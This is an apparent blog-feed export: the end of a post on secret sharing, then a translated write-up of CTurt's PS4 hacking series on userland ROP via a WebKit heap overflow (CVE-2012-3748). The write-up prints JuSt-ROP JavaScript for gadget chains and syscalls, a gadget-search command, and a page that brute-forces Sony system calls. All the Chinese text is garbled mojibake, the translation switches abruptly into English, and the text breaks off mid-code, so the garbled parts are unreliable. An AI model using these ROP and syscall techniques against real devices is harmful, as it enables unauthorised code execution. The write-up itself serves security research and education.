äº§ç”Ÿnä¸ªæ¬¡å¯†é’¥$V_i=U\times A_i$ï¼Œä¸å¯æš´éœ²ï¼Œåˆ†åˆ«ä¿å­˜ ä¸»å¯†é’¥ä¸º$K=U\times A_0$ å…¬å¼€çŸ©é˜µ$\lbrace A_1,A_2,\cdots,A_n\rbrace$ å¯†é’¥æ¢å¤ é€‰å–mç»„æ¬¡å¯†é’¥$\lbrace V_1,V_2,\cdots,V_m\rbrace$ æ‹¼æŽ¥çŸ©é˜µ$A=[A_1|A_2|\cdots|A_m]$ è®¡ç®—é€†çŸ©é˜µ$A^{-1}$ è®¡ç®—$U=[V_1|V_2|\cdots|V_m]\times A^{-1}$ è®¡ç®—$K=U\times A_0$ Shamir é—¨é™æ³•ç§˜å¯†åˆ†å‘ä»»å–$a_1,a_2,\cdots,a_{t-1}\in GF(q)$æž„é€ ä¸€ä¸ªå¤šé¡¹å¼ï¼š $$f(x)=(d+a_1x+a_2x^2+\cdots+a_{t-1}x^{t-1})modq$$ å…¶ä¸­$d$ä¸ºå¯†é’¥ï¼Œè®¡ç®—$d_i=f(i)(i=1,2,\cdots,n)$ï¼Œç§°$d_i$ä¸ºéƒ¨åˆ†å¯†é’¥ï¼Œå°†$d_i$åˆ†åˆ«é€šè¿‡å®‰å…¨çš„ä¿¡é“å‘é€ç»™æ¯ä¸ªåˆ†äº«è€…$P_i(=1,2,\cdots,n)$ã€‚ ç§˜å¯†æ¢å¤å¦‚æžœæœ‰$k$ä¸ªå…±äº«è€…æƒ³æ¢å¤ç§˜å¯†ä¿¡æ¯$d$ï¼Œä»–ä»¬åˆ†åˆ«æ‹¿å‡ºè‡ªå·±çš„$d_i$ï¼Œç„¶åŽåˆ©ç”¨Lagrangeæ’å€¼å…¬å¼ï¼š $$h(x)=\sum_{i=1}^td_i\lambda_{x,i}$$ å…¶ä¸­$\lambda_{x,i}=\prod_{k=1,k\neq j}^t\frac{i-k}{j-k}$ï¼Œç”±$d=f(0)=h(0)$å¾—åˆ°ç§˜å¯†ä¿¡æ¯$d$ã€‚]]></content>
      <categories>
        <category>å¯†ç å­¦åŸºç¡€</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>æ•°å­—ç­¾å</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç ´è§£ PS4 - ç¬¬ä¸€éƒ¨åˆ†ï¼šPS4 å®‰å…¨å’Œç”¨æˆ·æ€ ROP ç®€ä»‹]]></title>
    <url>%2F2019%2F05%2F06%2F%E7%A0%B4%E8%A7%A3-PS4-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[åŽŸæ–‡æ ‡é¢˜ Hacking the PS4, part 1 Introduction to PS4â€™s security, and userland ROP (æ—¥æœŸæœªçŸ¥) ä½œè€…ï¼šCTurt ç”±äºŽç›®å‰å¾ˆé•¿æ—¶é—´æ²¡æœ‰å…³äºŽ PS4 ç ´è§£çš„é‡å¤§å…¬å‘Šï¼Œæˆ‘æƒ³è§£é‡Šä¸€ä¸‹ PS4 ç ´è§£å·²ç»èµ°äº†å¤šè¿œï¼Œä»¥åŠé˜»æ­¢å®ƒè¿›ä¸€æ­¥å‘å±•çš„åŽŸå› ã€‚ æˆ‘å°†è§£é‡Šä¸€äº›é€šç”¨äºŽæ‰€æœ‰çŽ°ä»£ç³»ç»Ÿçš„å®‰å…¨æ¦‚å¿µï¼Œä»¥åŠæˆ‘åœ¨ PS4 ä¸Šè¿è¡Œ ROP æµ‹è¯•æ‰€åšçš„å‘çŽ°ã€‚ æœ¬ç³»åˆ—æ–‡ç« çš„ç›®æ ‡æ˜¯å±•ç¤ºå®Œæ•´çš„æ¼æ´žåˆ©ç”¨é“¾ï¼Œä»Žè®¿é—® Internet æµè§ˆå™¨çš„ç½‘é¡µï¼Œåˆ°æœ€ç»ˆåœ¨ PS4 ä¸Šå®žçŽ°å†…æ ¸ä»£ç æ‰§è¡Œã€‚ å¦‚æžœæ‚¨å¯¹æ¼æ´žæŒ–æŽ˜ä¸æ˜¯ç‰¹åˆ«ç†Ÿæ‚‰ï¼Œé‚£ä¹ˆæ‚¨åº”è¯¥å…ˆé˜…è¯»æˆ‘çš„å…³äºŽé€šè¿‡ä¿å­˜æ–‡ä»¶ä¸­çš„æ ˆç²‰ç¢Žæ¼æ´žæ¥ç ´è§£ DS æ¸¸æˆçš„æ–‡ç« ã€‚ æ‚¨å¯ä»¥åœ¨æ­¤ä¸‹è½½æˆ‘çš„å®Œæ•´è®¾ç½®ä»¥è‡ªè¡Œè¿è¡Œè¿™äº›æµ‹è¯•ï¼›å®ƒç›®å‰ä»…é€‚ç”¨äºŽå›ºä»¶ 1.76ã€‚å¦‚æžœæ‚¨æ­£åœ¨ä½¿ç”¨è¾ƒæ—§çš„å›ºä»¶å¹¶å¸Œæœ›æ›´æ–°åˆ° 1.76ï¼Œåˆ™å¯ä»¥ä¸‹è½½ 1.76 PUP æ–‡ä»¶å¹¶é€šè¿‡ USB æ›´æ–°ã€‚ PS4 èƒŒæ™¯ æ‚¨å¯èƒ½çŸ¥é“ PS4 ä½¿ç”¨çš„æ˜¯å®šåˆ¶çš„ AMD x86-64 CPUï¼ˆ8æ ¸ï¼‰ï¼Œå³ä½¿æ­¤ç‰¹å®šç‰ˆæœ¬å¯èƒ½ä¸Žå·²çŸ¥æ ‡å‡†ç¨æœ‰ä¸åŒï¼Œç›®å‰ä»æœ‰è®¸å¤šç ”ç©¶æˆæžœå¯ç”¨äºŽæ­¤ CPU æž¶æž„ã€‚ ä¾‹å¦‚ï¼ŒPFLAï¼ˆPage Fault Liberation Armyï¼‰åœ¨ 29C3 å¤§ä¼šæœŸé—´å‘å¸ƒäº†ä»…ä½¿ç”¨é¡µé”™è¯¯å’Œ x86 MMU å®žçŽ°å®Œæ•´å›¾çµæœºçš„æ¦‚å¿µè¯æ˜Žï¼Œæ‚¨å¯ä»¥åœ¨ YouTube ä¸ŠæŸ¥çœ‹ä»–ä»¬çš„ç²¾å½©è§†é¢‘ã€‚ å¦‚æžœæ‚¨å°è¯•åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œä»£ç å¹¶å¸Œæœ›åœ¨ä¸»æœº CPU ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œä¹Ÿä¼šå¾ˆæœ‰è¶£ã€‚ â€“ EurAsia æ–°é—» 3251 å·æ–‡ç«  é™¤äº†è¡¨çŽ°è‰¯å¥½çš„ CPU æž¶æž„å¤–ï¼ŒPS4 ä¸­ä½¿ç”¨çš„å¤§éƒ¨åˆ†è½¯ä»¶éƒ½æ˜¯å¼€æºçš„ã€‚ æœ€å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒPS4 çš„ Orbis OS åŸºäºŽ FreeBSD 9.0ï¼Œå°±åƒ PS3 çš„æ“ä½œç³»ç»Ÿä¸€æ ·ï¼ˆä¹Ÿæœ‰éƒ¨åˆ† NetBSDï¼‰ï¼›å¹¶åŒ…æ‹¬å„ç§è®¸å¤šå…¶ä»–å¼€æºè½¯ä»¶ï¼Œå¦‚ Mono VM å’Œ WebKitã€‚ ä»Ž WebKit å…¥æ‰‹WebKit æ˜¯å¼€æºçš„å¸ƒå±€å¼•æ“Žï¼Œå®ƒè¢«ç”¨äºŽ iOSï¼ŒWii Uï¼Œ3DSï¼ŒPS Vita å’Œ PS4 çš„æµè§ˆå™¨ä¸­æ¥å‘ˆçŽ°ç½‘é¡µã€‚ å°½ç®¡ WebKit è¢«å¹¿æ³›ä½¿ç”¨ï¼Œä½†å®ƒç¡®å®žå­˜åœ¨æ¼æ´žï¼›é€šè¿‡é˜…è¯» Pwn2Own write-upsï¼Œä½ å¯ä»¥äº†è§£å…¶ä¸­çš„è®¸å¤šå†…å®¹ã€‚ ç‰¹åˆ«æ˜¯ PS4 1.76 ç‰ˆæœ¬å›ºä»¶ä¸­çš„æµè§ˆå™¨ä½¿ç”¨çš„ WebKit ç‰ˆæœ¬æ˜“å—åˆ° CVE-2012-3748 çš„æ”»å‡»ï¼Œè¿™æ˜¯ç”± JSArray :: sort(...) æ–¹æ³•ä¸­åŸºäºŽå †çš„ç¼“å†²åŒºæº¢å‡ºé€ æˆçš„ã€‚ 2014å¹´ï¼ŒNAS å’Œ Proxima å®£å¸ƒä»–ä»¬å·²ç»æˆåŠŸåœ°å°†ä¸€ä¸ªåˆ©ç”¨è¯¥æ¼æ´žç ´è§£ Mac OS X Safari ä»£ç ç§»æ¤åˆ° PS4 çš„æµè§ˆå™¨ï¼Œå¹¶å…¬å¸ƒäº†ä½œä¸ºç ´è§£ PS4 ç¬¬ä¸€ä¸ªå…¥å£ç‚¹çš„ PoC ä»£ç ã€‚ è¿™ä½¿æˆ‘ä»¬å¯ä»¥ä»»æ„è¯»å†™ WebKit è¿›ç¨‹å¯ä»¥è¯»å–å’Œå†™å…¥çš„å†…å®¹ï¼Œè¿™äº›å†…å®¹å¯ä»¥ç”¨äºŽè½¬å‚¨æ¨¡å—ï¼Œå¹¶è¦†ç›–æ ˆä¸Šçš„è¿”å›žåœ°å€ï¼Œè®©æˆ‘ä»¬æŽ§åˆ¶æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆripï¼‰æ¥å®žçŽ° RO Pæ‰§è¡Œã€‚ ä»Žé‚£æ—¶èµ·ï¼ŒWebKit ä¸­å‘çŽ°äº†è®¸å¤šå…¶ä»–æ¼æ´žï¼Œè¿™äº›æ¼æ´žå¯èƒ½è¢«ç”¨ä½œ PS4 åŽæœŸå›ºä»¶çš„å…¥å£ç‚¹ï¼Œä½†æˆªè‡³æ’°å†™æ—¶ï¼Œæ²¡æœ‰äººå…¬å¼€å®£ç§°å°†ä»»ä½•è¿™äº›æ¼æ´žåˆ©ç”¨ä»£ç ç§»æ¤åˆ° PS4ã€‚ å¦‚æžœæ‚¨ä»Žæœªç™»å½• PSNï¼Œæ‚¨çš„ PS4 å°†æ— æ³•æ‰“å¼€ Internet æµè§ˆå™¨ï¼Œä½†æ‚¨å¯ä»¥è½¬åˆ°â€œè®¾ç½®â€ï¼Œç„¶åŽé€‰æ‹©â€œç”¨æˆ·æŒ‡å—â€æ‰“å¼€åŠŸèƒ½æœ‰é™çš„ Web æµè§ˆå™¨è§†å›¾ï¼Œæ‚¨å¯ä»¥ç”¨ä»£ç†æŽ§åˆ¶å…¶ä¸­çš„å†…å®¹ã€‚ ROP æ˜¯ä»€ä¹ˆï¼Ÿä¸Ž DS ç­‰æ—©æœŸè®¾å¤‡ä¸åŒï¼ŒPS4 æœ‰ä¸€ä¸ªå†…æ ¸æ¥æŽ§åˆ¶å†…å­˜ä¸åŒåŒºåŸŸçš„å±žæ€§ã€‚å…¶ä¸­æ ‡è®°ä¸ºå¯æ‰§è¡Œçš„å†…å­˜é¡µé¢ä¸èƒ½è¢«è¦†å†™ï¼Œå¹¶ä¸”æ ‡è®°ä¸ºå¯å†™çš„å†…å­˜é¡µé¢ä¸èƒ½è¢«æ‰§è¡Œ; è¿™ç§°ä¸ºæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰ã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½åªå°†æœ‰æ•ˆè´Ÿè½½å¤åˆ¶åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå·²åŠ è½½åˆ°å†…å­˜ä¸­å¹¶æ ‡è®°ä¸ºå¯æ‰§è¡Œçš„ä»£ç ã€‚ å¦‚æžœæˆ‘ä»¬ä¸èƒ½å°†è‡ªå·±çš„ä»£ç ç¼–å†™åˆ°æŸä¸ªåœ°å€åœ°å€ï¼Œé‚£ä¹ˆè·³è½¬åˆ°è¯¥åœ°å€å¹¶ä¸æ˜¯éžå¸¸æœ‰ç”¨ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ ROPã€‚ ROPï¼ˆReturn-Oriented Programmingï¼‰æ˜¯ä¼ ç»Ÿæ ˆç²‰ç¢ŽæŠ€æœ¯çš„æ‰©å±•ï¼Œæˆ‘ä»¬å¯ä»¥å°†è®¸å¤šä¸åŒçš„åœ°å€ï¼ˆç§°ä¸º gadgetsï¼‰é“¾æŽ¥åœ¨ä¸€èµ·ï¼Œè€Œä¸æ˜¯ä»…è¦†ç›– rip å°†è·³è½¬åˆ°çš„å•ä¸ªå€¼ã€‚ ä¸€æ¡ gadget é€šå¸¸åªæ˜¯ä¸€ä¸ªæ‰€éœ€çš„æŒ‡ä»¤ä»¥åŠä¸€ä¸ª retã€‚ åœ¨ x86_64 ç¨‹åºé›†ä¸­ï¼Œå½“åˆ°è¾¾ ret æŒ‡ä»¤æ—¶ï¼Œç¨‹åºä¼šä»Žæ ˆä¸­å¼¹å‡ºä¸€ä¸ª 64 ä½çš„å€¼å¹¶ä¸”å°† rip è·³è½¬åˆ°å®ƒï¼›ç”±äºŽæˆ‘ä»¬å¯ä»¥æŽ§åˆ¶å †æ ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿æ¯ä¸ª ret æŒ‡ä»¤è·³è½¬åˆ°ä¸‹ä¸€ä¸ªæ‰€éœ€çš„ gadgetã€‚ ä¾‹å¦‚ 0x80000 å¤„ï¼š mov rax, 0 ret 0x90000 å¤„ï¼š mov rbx, 0 ret If we overwrite a return address on the stack to contain 0x80000 followed by 0x90000, then as soon as the first ret instruction is reached execution will jump to mov rax, 0, and immediately afterwards, the next ret instruction will pop 0x90000 off the stack and jump to mov rbx, 0. Effectively this chain will set both rax and rbx to 0, just as if we had written the code into a single location and executed it from there. ROP chains arenâ€™t just limited to a list of addresses though; assuming that from 0xa0000 contains these instructions: pop rax ret We can set the first item in the chain to 0xa0000 and the next item to any desired value for rax. Gadgets also donâ€™t have to end in a ret instruction; we can use gadgets ending in a jmp: add rax, 8 jmp rcx By making rcx point to a ret instruction, the chain will continue as normal: chain.add(&quot;pop rcx&quot;, &quot;ret&quot;); chain.add(&quot;add rax, 8; jmp rcx&quot;); Sometimes you wonâ€™t be able to find the exact gadget that you need on its own, but with other instructions after it. For example, if you want to set r8 to something, but only have this gadget, you will have to set r9 to some dummy value: pop r8 pop r9 ret Although you may have to be creative with how you write ROP chains, it is generally accepted that within a sufficiently large enough code dump, there will be enough gadgets for Turing-complete functionality; this makes ROP a viable method of defeating DEP. å¯»æ‰¾ gadgetsThink of ROP as writing a new chapter to a book, using only words that have appeared at the end of sentences in the previous chapters. Itâ€™s obvious from the structure of most sentences that we probably wonâ€™t be able to find words like â€˜andâ€™ or â€˜butâ€™ appearing at the end of any sentences, but we will need these connectives in order to write anything meaningful. It is quite possible however, that a sentence has ended with â€˜sandâ€™. Although the author only ever intended for the word to be read from the â€˜sâ€™, if we start reading from the â€˜aâ€™, it will appear as an entirely different word by coincidence, â€˜andâ€™. These principles also apply to ROP. Since almost all functions are structured with a prologue and epilogue: ; Save registers push rbp mov rbp, rsp push r15 push r14 push r13 push r12 push rbx sub rsp, 18h ; Function body ; Restore registers add rsp, 18h pop rbx pop r12 pop r13 pop r14 pop r15 pop rbp ret Youâ€™d expect to only be able to find pop gadgets, or more rarely, something like xor rax, rax to set the return value to 0 before returning. Having a comparison like: cmp [rax], r12 ret Wouldnâ€™t make any sense since the result of the comparison isnâ€™t used by the function. However, there is still a possibility that we can find gadgets like these. x86_64 instructions are similar to words in that they have variable lengths, and can mean something entirely different depending on where decoding starts. The x86_64 architecture is a variable-length CISC instruction set. Return-oriented programming on the x86_64 takes advantage of the fact that the instruction set is very â€œdenseâ€, that is, any random sequence of bytes is likely to be interpretable as some valid set of x86_64 instructions. â€“ Wikipedia To demonstrate this, take a look at the end of this function from the WebKit module: 000000000052BE0D mov eax, [rdx+8] 000000000052BE10 mov [rsi+10h], eax 000000000052BE13 or byte ptr [rsi+39h], 20h 000000000052BE17 ret Now take a look at what the code looks like if we start decoding from 0x52be14: 000000000052BE14 cmp [rax], r12 000000000052BE17 ret Even though this code was never intended to be executed, it is within an area of memory which has been marked as executable, so it is perfectly valid to use as a gadget. Of course, it would be incredibily time consuming to look at every possible way of interpreting code before every single ret instruction manually; and thatâ€™s why tools exist to do this for you. The one which I use to search for ROP gadgets is rp++; to generate a text file filled with gadgets, just use: rp-win-x64 -f mod14.bin --raw=x64 --rop=1 --unique &gt; mod14.txt General protection faultsIf we _do_ perform an access violation, such as by trying to execute a non-executable page of memory, or by trying to write to a non-writable page of memory, a general protection fault, or more specifically in this instance, a segmentation fault, will occur. For example, trying to execute code on the stack, which is mapped as read and write only: setU8to(chain.data + 0, 0xeb); setU8to(chain.data + 1, 0xfe); chain.add(chain.data); And trying to write to code, which is mapped as read and execute only: setU8to(moduleBases[webkit], 0); If a general protection fault occurs, a message saying â€œThere is not enough free system memoryâ€ will appear, and the page will fail to load: This message will also be displayed for other hard faults, such as division by 0, or execution of an invalid instruction or unimplemented system call, but most commonly it will be encountered by performing a segmentation fault. ASLRAddress Space Layout Randomization (ASLR) is a security technique which causes the base addresses of modules to be different every time you start the PS4. It has been reported to me that very old firmwares (1.05) donâ€™t have ASLR enabled, but it was introduced sometime before firmware 1.70. Note that kernel ASLR is not enabled (for firmwares 1.76 and lower at least), which will be proved later in the article. For most exploits ASLR would be a problem because if you donâ€™t know the addresses of the gadgets in memory, you would have no idea what to write to the stack. Luckily for us, we arenâ€™t limited to just writing static ROP chains. We can use JavaScript to read the modules table, which will tell us the base addresses of all loaded modules. Using these bases, we can then calculate the addresses of all our gadgets before we trigger ROP execution, defeating ASLR. The modules table also includes the filenames of the modules: WebProcess.self libkernel.sprx libSceLibcInternal.sprx libSceSysmodule.sprx libSceNet.sprx libSceNetCtl.sprx libSceIpmi.sprx libSceMbus.sprx libSceRegMgr.sprx libSceRtc.sprx libScePad.sprx libSceVideoOut.sprx libScePigletv2VSH.sprx libSceOrbisCompat.sprx libSceWebKit2.sprx libSceSysCore.sprx libSceSsl.sprx libSceVideoCoreServerInterface.sprx libSceSystemService.sprx libSceCompositeExt.sprx Although the PS4 predominantly uses the [Signed] PPU Relocatable Executable ([S]PRX) format for modules, some string references to [Signed] Executable and Linking Format ([S]ELF) object files can also be found in the libSceSysmodule.sprx dump, such as bdj.elf, web_core.elf and orbis-jsc-compiler.self. This combination of modules and objects is similar to what is used in the PSP and PS3. You can view a complete list of all modules available (not just those loaded by the browser) in libSceSysmodule.sprx. We can load and dump some of these through several of Sonyâ€™s custom system calls, which will be explained later in this article. JuSt-ROPUsing JavaScript to write and execute dynamic ROP chains gives us a tremendous advantage over a traditional, static buffer overflow attack. As well as being necessary to defeat ASLR, JavaScript also lets us read the user agent of the browser, and provide different ROP chains for different browser versions, giving our exploit a greater range of compatibility. We can even use JavaScript to read the memory at our gadgetsâ€™ addresses to check that they are correct, giving us almost perfect reliability. Theoretically, you could take this even further by writing a script to dynamically find ROP gadgets and then build ROP chains on the fly. Writing ROP chains dynamically, rather than generating them with a script beforehand, just makes sense. I created a JavaScript framework for writing ROP chains, JuSt-ROP, for this very reason. JavaScript caveatsJavaScript represents numbers using the IEEE-754 double-precision (64 bit) format. This provides us with 53 bit precision, meaning that it isnâ€™t possible to represent every 64 bit value, approximations will have to be used for some. If you just need to set a 64 bit value to something low, like 256, then setU64to will be fine. But for situations in which you need to write a buffer or struct of data, there is the possibility that certain bytes will be written incorrectly if it has been written in 64 bit chunks. Instead, you should write data in 32 bit chunks (remembering that the PS4 is little endian), to ensure that every byte is exact. ç³»ç»Ÿè°ƒç”¨Interestingly, the PS4 uses the same calling convention as Linux and MS-DOS for system calls, with arguments stored in registers, rather than the traditional UNIX way (which FreeBSD uses by default), with arguments stored in the stack: rax - System call number rdi - Argument 1 rsi - Argument 2 rdx - Argument 3 r10 - Argument 4 r8 - Argument 5 r9 - Argument 6 We can try to perform any system call with the following JuSt-ROP method: this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) { console.log(&quot;syscall &quot; + name); this.add(&quot;pop rax&quot;, systemCallNumber); if(typeof(arg1) !== &quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1); if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2); if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3); if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4); if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5); if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6); this.add(&quot;mov r10, rcx; syscall&quot;); } Just make sure to set the stack base to some free memory beforehand: this.add(&quot;pop rbp&quot;, stackBase + returnAddress + 0x1400); Using system calls can tell us a huge amount about the PS4 kernel. Not only that, but using system calls is most likely the only way that we can interact with the kernel, and thus potentially trigger a kernel exploit. If you are reverse engineering modules to identify some of Sonyâ€™s custom system calls, you may come across an alternative calling convention: Sometimes Sony performs system calls through regular system call 0 (which usually does nothing in FreeBSD), with the first argument (rdi) controlling which system call should be executed: rax - 0 rdi - System call number rsi - Argument 1 rdx - Argument 2 r10 - Argument 3 r8 - Argument 4 r9 - Argument 5 It is likely that Sony did this to have easy compatibility with the function calling convention. For example: .global syscall syscall: xor rax, rax mov r10, rcx syscall ret Using this, they can perform system calls from C using the function calling convention: int syscall(); int getpid(void) { return syscall(20); } When writing ROP chains, we can use either convention: // Both will get the current process ID: chain.syscall(&quot;getpid&quot;, 20); chain.syscall(&quot;getpid&quot;, 0, 20); Itâ€™s good to be aware of this, because we can use whichever one is more convenient for the gadgets that are available. getpidJust by using system call 20, getpid(void), we can learn a lot about the kernel. The very fact that this system call works at all tells us that Sony didnâ€™t bother mixing up the system call numbers as a means of security through obscurity (under the BSD license they could have done this without releasing the new system call numbers). So, we automatically have a list of system calls in the PS4 kernel to try. Secondly, by calling getpid(), restarting the browser, and calling it again, we get a return value 2 higher than the previous value. This tells us that the Internet Browser app actually consists of 2 separate processes: the WebKit core (which we take over), that handles parsing HTML and CSS, decoding images, and executing JavaScript for example, and another one to handle everything else: displaying graphics, receiving controller input, managing history and bookmarks, etc. Also, although FreeBSD has supported PID randomisation since 4.0, sequential PID allocation is the default behaviour. The fact that PID allocation is set to the default behaviour indicates that Sony likely didnâ€™t bother adding any additional security enhancements such as those encouraged by projects like HardenedBSD, other than userland ASLR. How many custom system calls are there?The last standard FreeBSD 9 system call is wait6, number 532; anything higher than this must be a custom Sony system call. Invoking most of Sonyâ€™s custom system calls without the correct arguments will return error 0x16, &quot;Invalid argument&quot;; however, any compatibility or unimplemented system calls will report the â€œThere is not enough free system memoryâ€ error. Through trial and error, I have found that system call number 617 is the last Sony system call, anything higher is unimplemented. From this, we can conclude that there are 85 custom Sony system calls in the PS4â€™s kernel (617 - 532). libkernel.sprxTo identify how custom system calls are used by libkernel, you must first remember that it is just a modification of the standard FreeBSD 9.0 libraries. Hereâ€™s an extract of _libpthread_init from thr_init.c: /* * Check for the special case of this process running as * or in place of init as pid = 1: */ if ((_thr_pid = getpid()) == 1) { /* * Setup a new session for this process which is * assumed to be running as root. */ if (setsid() == -1) PANIC(&quot;Can&apos;t set session ID&quot;); if (revoke(_PATH_CONSOLE) != 0) PANIC(&quot;Can&apos;t revoke console&quot;); if ((fd = __sys_open(_PATH_CONSOLE, O_RDWR)) &amp;lt; 0) PANIC(&quot;Can&apos;t open console&quot;); if (setlogin(&quot;root&quot;) == -1) PANIC(&quot;Can&apos;t set login to root&quot;); if (_ioctl(fd, TIOCSCTTY, (char *) NULL) == -1) PANIC(&quot;Can&apos;t set controlling terminal&quot;); } The same function can be found at offset 0x215F0 from libkernel.sprx. This is how the above extract looks from within a libkernel dump: call getpid mov cs:dword_5B638, eax cmp eax, 1 jnz short loc_2169F call setsid cmp eax, 0FFFFFFFFh jz loc_21A0C lea rdi, aDevConsole ; &quot;/dev/console&quot; call revoke test eax, eax jnz loc_21A24 lea rdi, aDevConsole ; &quot;/dev/console&quot; mov esi, 2 xor al, al call open mov r14d, eax test r14d, r14d js loc_21A3C lea rdi, aRoot ; &quot;root&quot; call setlogin cmp eax, 0FFFFFFFFh jz loc_21A54 mov edi, r14d mov esi, 20007461h xor edx, edx xor al, al call ioctl cmp eax, 0FFFFFFFFh jz loc_21A6C Reversing module dumps to analyse system callslibkernel isnâ€™t completely open source though; thereâ€™s also a lot of custom code which can help disclose some of Sonyâ€™s system calls. Although this process will vary depending on the system call you are looking up; for some, it is fairly easy to get a basic understanding of the arguments that are passed to it. The system call wrapper will be declared somewhere in libkernel.sprx, and will almost always follow this template: 000000000000DB70 syscall_601 proc near 000000000000DB70 mov rax, 259h 000000000000DB77 mov r10, rcx 000000000000DB7A syscall 000000000000DB7C jb short error 000000000000DB7E retn 000000000000DB7F 000000000000DB7F error: 000000000000DB7F lea rcx, sub_DF60 000000000000DB86 jmp rcx 000000000000DB86 syscall_601 endp Note that the mov r10, rcx instruction doesnâ€™t necessarily mean that the system call takes at least 4 arguments; all system call wrappers have it, even those that take no arguments, such as getpid. Once youâ€™ve found the wrapper, you can look up xrefs to it: 0000000000011D50 mov edi, 10h 0000000000011D55 xor esi, esi 0000000000011D57 mov edx, 1 0000000000011D5C call syscall_601 0000000000011D61 test eax, eax 0000000000011D63 jz short loc_11D6A Itâ€™s good to look up several of these, just to make sure that the registers werenâ€™t modified for something unrelated: 0000000000011A28 mov edi, 9 0000000000011A2D xor esi, esi 0000000000011A2F xor edx, edx 0000000000011A31 call syscall_601 0000000000011A36 test eax, eax 0000000000011A38 jz short loc_11A3F Consistently, the first three registers of the system call convention (rdi, rsi, and rdx) are modified before invoking the call, so we can conclude with reasonable confidence that it takes 3 arguments. For clarity, this is how we would replicate the calls in JuSt-ROP: chain.syscall(&quot;unknown&quot;, 601, 0x10, 0, 1); chain.syscall(&quot;unknown&quot;, 601, 9, 0, 0); As with most system calls, it will return 0 on success, as seen by the jz conditional after testing the return value. Looking up anything beyond than the amount of arguments will require a much more in-depth analysis of the code before and after the call to understand the context, but this should help you get started. Brute forcing system callsAlthough reverse engineering module dumps is the most reliable way to identify system calls, some arenâ€™t referenced at all in the dumps we have so we will need to analyse them blindly. If we guess that a certain system call might take a particular set of arguments, we can brute force all system calls which return a certain value (0 for success) with the arguments that we chose, and ignore all which returned an error. We can also pass 0s for all arguments, and brute force all system calls which return useful errors such as 0xe, &quot;Bad address&quot;, which would indicate that they take at least one pointer. Firstly, we will need to execute the ROP chain as soon as the page loads. We can do this by attaching our function to the body elementâ€™s onload: &lt;body onload=&quot;exploit()&quot;&gt; Next we will need to perform a specific system call depending on an HTTP GET value. Although this can be done with JavaScript, I will demonstrate how to do this using PHP for simplicity: var Sony = 533; chain.syscall(&quot;Sony system call&quot;, Sony + &amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt;, 0, 0, 0, 0, 0, 0); chain.write_rax_ToVariable(0); Once the system call has executed, we can check the return value, and if it isnâ€™t interesting, redirect the page to the next system call: if(chain.getVariable(0) == 0x16) window.location.assign(&quot;index.php?b=&quot; + (&amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt; + 1).toString()); Running the page with ?b=0 appended to the end will start the brute force from the first Sony system call. Although this method requires a lot of experimentation, by passing different values to some of the system calls found by brute forcing and analysing the new return values, there are a few system calls which you should be able to partially identify. System call 538As an example, Iâ€™ll take a look at system call 538, without relying on any module dumps. These are the return values depending on what is passed as the first argument: 0 - 0x16, &quot;Invalid argument&quot; 1 - 0xe, &quot;Bad address&quot; Pointer to 0s - 0x64 initially, but each time the page is refreshed this value increases by 1 Other potential arguments to try would be PID, thread ID, and file descriptor. Although most system calls will return 0 on success, due to the nature of the return value increasing after each time it is called, it seems like it is allocating a resource number, such as a file descriptor. The next thing to do would be to look at the data before and after performing the system call, to see if it has been written to. Since there is no change in the data, we can assume that it is an input for now. I then tried passing a long string as the first argument. You should always try this with every input you find because there is the possibility of discovering a buffer overflow. writeString(chain.data, &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;); chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0); The return value for this is 0x3f, ENAMETOOLONG. Unfortunately it seems that this system call correctly limits the name (32 bytes including NULL truncator), but it does tell us that it _is_ expecting a string, rather than a struct. We now have a few possibilities for what this system call is doing, the most obvious being something related to the filesystem (such as a custom mkdir or open), but this doesnâ€™t seem particularly likely seeing as a resource was allocated even before we wrote any data to the pointer. To test whether the first parameter is a path, we can break it up with multiple / characters to see if this allows for a longer string: writeString(chain.data, &quot;aaaaaaaaaa/aaaaaaaaaa/aaaaaaaaaa&quot;); chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0); Since this also returns 0x3f, we can assume that the first argument isnâ€™t a path; it is a name for something that gets allocated a sequential identifier. After analysing some more system calls, I found that the following all shared this exact same behaviour: 533 538 557 574 580 From the information that we have so far, it is almost impossible to pinpoint exactly what these system calls do, but as you run more tests, further information will slowly be revealed. To save you some time, system call 538 is allocating an event flag (and it doesnâ€™t just take a name). Using general knowledge of how a kernel works, you can guess, and then verify, what the system calls are allocating (semaphores, mutexes, etc). Dumping additional modulesWe can dump additional modules by following these stages: Load the module Get the moduleâ€™s base address Dump the module Iâ€™ve extracted and posted a list of all module names on psdevwiki. To load a module we will need to use the sceSysmoduleLoadModule function from libSceSysmodule.sprx + 0x1850. The first parameter is the module ID to load, and the other 3 should just be passed 0. The following JuSt-ROP method can be used to perform a function call: this.call = function(name, module, address, arg1, arg2, arg3, arg4, arg5, arg6) { console.log(&quot;call &quot; + name); if(typeof(arg1) !== 